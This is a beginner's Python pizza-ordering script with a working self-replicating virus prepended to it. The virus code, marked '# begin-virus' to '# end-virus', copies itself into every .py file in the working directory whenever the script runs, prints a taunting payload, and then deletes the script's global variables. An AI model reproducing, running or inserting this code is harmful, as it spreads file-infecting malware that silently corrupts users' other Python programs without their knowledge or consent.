# begin-virus

import glob

def find_files_to_infect(directory = "."):
    return [file for file in glob.glob("*.py")]

def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data:=get_content_if_infectable(file)):
        with open(file, "w") as infected_file:
            infected_file.write("".join(virus_code))
            infected_file.writelines(data)

def get_virus_code():

    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus\n" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus\n" in line:
            virus_code_on = False
            break

    return virus_code

def summon_chaos():
    # the virus payload
    print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

# entry point 

try:
    # retrieve the virus code from the current infected script
    virus_code = get_virus_code() 

    # look for other files to infect
    for file in find_files_to_infect():
        infect(file, virus_code)

    # call the payload
    summon_chaos()

# except:
#     pass

finally:
    # delete used names from memory
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i

# end-viruspizza = {'cheese:' 'mozzarella', 'sauce:''red'}
pizza_2 = {'cheese:' 'goat', 'sauce:''green'}
pizza_3 = {'cheese:''landen', 'sauce:''king'}

pizzas = [pizza, pizza_2, pizza_3]

for pizza in pizzas:
    print(pizza)

name = input("Please enter your name:")
print(f"\nHello, {name}!")
order = input("Which pizza would you like to order?")
how_many = input("How many pizzas would you like to order:")
prompt = '\nTake your pick: 1,2,3'
prompt += "\nEnter 'quit' to end your order:"
message = ""
while message != 'quit':
    message = input(prompt)
    print(message)